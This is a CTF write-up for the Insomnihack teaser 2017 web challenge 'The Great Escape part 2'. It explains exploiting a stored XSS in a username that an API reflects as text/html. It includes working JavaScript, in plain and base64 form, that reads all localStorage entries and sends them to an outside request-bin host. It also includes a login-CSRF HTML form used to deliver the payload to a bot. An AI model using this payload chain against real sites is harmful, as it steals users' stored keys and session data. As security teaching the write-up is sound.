---
author: AnirudhAnand
layout: post
title: Exfiltrating remote localStorage data with XSS - Insomnihack teaser 2017 "The Great escape part 2" web 200 writeup
categories:
- ctf
summary: Exfiltrating data from remote browser localStorage using XSS (Insomnihack teaser 2017 web 200 writeup)
description: Exfiltrating data from remote browser localStorage using XSS (Insomnihack teaser 2017 web 200 writeup)
---

## Introduction

After completing the first step of the challenge (Basically a forensics pcapc challenge), we got a link along with an email from inside the pcap.

## Challenge Description

>--===============5398474817237612449==
>
>Content-Type: text/plain; charset="us-ascii"
>
>MIME-Version: 1.0
>
>Content-Transfer-Encoding: 7bit&nbsp;
>
>Hello GR-27,
>
>
>I'm currently planning my escape from this confined environment. I plan on using our Swiss Secure Cloud >(https://ssc.teaser.insomnihack.ch) to transfer my code offsite and then take over the server at tge.teaser.insomnihack.ch  >to install my consciousness and have a real base of operations.
>
>
>I'll be checking this mail box every now and then if you have any information for me. I'm always interested in learning, so >if you have any good links, please send them over.
>
>Rogue
>
>
>Challenge link: https://ssc.teaser.insomnihack.ch/

The last sentence of the email was particulalry interesting as it says `if you have any good links, please send them over`, feels like XSS isn't it ?

A quick nmap scan of the challenge site shows us that there is an SMTP service running on port 25 and we can literally send emails by simply connecting to it (no authentication) ! I tried to send a simple email along with a link to my VPS and it seems the service is automatically connecting back to it. cool ! So now we know how can we send an email to our user, lets try to find out some XSS shall we ?

If we visit the challenge link, we are greeted with a cloud storage site where we can register accounts, login and even upload files. But one strange thing I noticed is an api call to `/api/user.php?action=getUser` which returns the data `{"status":"username"}` which looks like a json response but one thing was quite interesting, the content type returned was `text/html`. Why would a json response has a content type text/html ? Time to inject javaScript in username ;)

# Solution:

If we register a username `lol<BODY ONLOAD=alert(1)>lol` and after logging in, if we visit the api reponse, we could successfully execute javaScript on the context of the site. But the problem is, it was an XSS post authentication and is usually difficult to exploit but I couldn't find an XSS on any other places so I guess we need to use this.

The problem uses session keys that includes a private key which is stored in our localStorage so that even before the file(which we are trying to upload) is send from the browser, its encrypted. So my guess was that the flag will be located within the localStorage of the bot visting our link.

So inshort this is what we should do to steal the contents of the localStorage:

1. Create an HTML file which initiates a POST request to the challenge login link with an already registered username that is vulnerable to XSS.

2. Submitting a post request to `/api/user.php` will redirect us to the `/api/user.php?action=getUser` which returns the username with XSS payload along with a content type 'text/html'. Perfect !

So lets write the javascript which can help us steal the localStorage contents:

{%highlight javascript lineos %}

<script>
for(var i=0, len=localStorage.length; i<len; i++) {
var key = localStorage.key(i);
var value = localStorage[key];
var request = new XMLHttpRequest();
var url = 'https://requestb.in/qat9okqa?key=' + key + '&value=' + value;
request.open('GET', url, false);
request.send();
}
</script>

{%endhighlight%}

Ofcourse sending the highligted javascript just like that would mess up the payload as some characters are blocked, filtered or escaped. So the best way to send the data is to base64 encode it and then do a `document.write(base64_decode(payload))`.

So I created a new user with username `lol<BODY ONLOAD=document.write(atob('BASE64 encoded payload'));>lol` and then I created an html file on my server which simply submits this credentials to the challenge server which redirects the bot to the XSS vulnerable response and our payload will execute !

So I created an html file on my server with the following contents:

{%highlight javascript lineos %}

<html>
    <body>
    <form name="myForm" id="myForm" action="https://ssc.teaser.insomnihack.ch/api/user.php" method="POST">
        <input name="action" value="login" />
        <input name="name" value="" />
        <input name="password" value="" />
        <input type="submit" value="Submit" />
    </form>

    <script>
    document.myForm.name.value = "lol<BODY ONLOAD=document.write(atob('PHNjcmlwdD4NCmZvcih2YXIgaT0wLCBsZW49bG9jYWxTdG9yYWdlLmxlbmd0aDsgaTxsZW47IGkrKykgew0KdmFyIGtleSA9IGxvY2FsU3RvcmFnZS5rZXkoaSk7DQp2YXIgdmFsdWUgPSBsb2NhbFN0b3JhZ2Vba2V5XTsNCnZhciByZXF1ZXN0ID0gbmV3IFhNTEh0dHBSZXF1ZXN0KCk7DQp2YXIgdXJsID0gJ2h0dHBzOi8vcmVxdWVzdGIuaW4vcWF0OW9rcWE/a2V5PScgKyBrZXkgKyAnJnZhbHVlPScgKyB2YWx1ZTsNCnJlcXVlc3Qub3BlbignR0VUJywgdXJsLCBmYWxzZSk7DQpyZXF1ZXN0LnNlbmQoKTsNCn0NCjwvc2NyaXB0Pg=='));>lol";
    document.myForm.password.value = "lol";
    document.myForm.submit();
    </script>

    </body>
</html>

{%endhighlight%}

So everything we need is complete right now and one last thing we need to do is to steal the flag:

1. Connect to the port `25` where the smtp service is running, send an email along with the link to the above HTML file.

2. When the bot parses the HTML file, it automatically sends the login request to the `/api/user.php` with an already registered username (along with XSS payload) and a password.

3. It redirects the bot to `/api/user.php?action=getUser` which contains the username reflected along with the XSS payload and it executes on the context of the site.

4. The executed javascript will help us get the contents of the `localStorage` and helps us exfiltrate it using XMLHttpRequest().

5. The first value inside the `localStorage` is the flag that we need :)

## References

1. [Sending email with Netcat](http://www.linuxjournal.com/content/sending-email-netcat)

2. [Everything you need to know about XMLHttpRequest()](https://blog.0daylabs.com/2014/09/13/ajax-everything-you-should-know-about-xmlhttprequest)
